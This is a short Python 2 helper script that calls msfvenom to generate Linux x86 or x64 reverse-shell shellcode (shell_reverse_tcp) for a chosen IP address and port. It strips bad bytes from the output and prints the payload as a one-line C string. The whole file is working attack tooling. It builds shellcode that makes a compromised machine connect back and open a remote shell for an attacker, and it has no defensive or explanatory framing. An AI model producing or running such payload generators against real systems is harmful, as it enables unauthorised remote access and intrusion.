#!/usr/bin/python2
from subprocess import Popen, PIPE
import sys, re

if len(sys.argv) != 4:
    exit("Usage: {} <IP> <PORT> (x86|x64)\n".format(sys.argv[0]))

r1 = ".*?Payload size: (.*.) bytes.*?"
IP = sys.argv[1]
PORT = sys.argv[2]
PLATFORM = sys.argv[3]

print("[+] => msfvenom -fc -p linux/{}/shell_reverse_tcp LHOST={} LPORT={} -b'\\x00\\x0a'".format(PLATFORM, IP, PORT))
process = Popen(["msfvenom", "-fc", "-plinux/{}/shell_reverse_tcp".format(PLATFORM), "LHOST={}".format(IP), "LPORT={}".format(PORT), "-b'\\x00\\x0a'"], stdout=PIPE, stderr=PIPE).communicate()

print("[+] => {} bytes.\n".format(re.findall(r1, process[1])[0]))
print(process[0][process[0].find('buf')+8:].replace('\n', '').replace('""', '')[:-1]+"  ###rs {} {} #{}".format(IP, PORT, re.findall(r1, process[1])[0])+"\n")
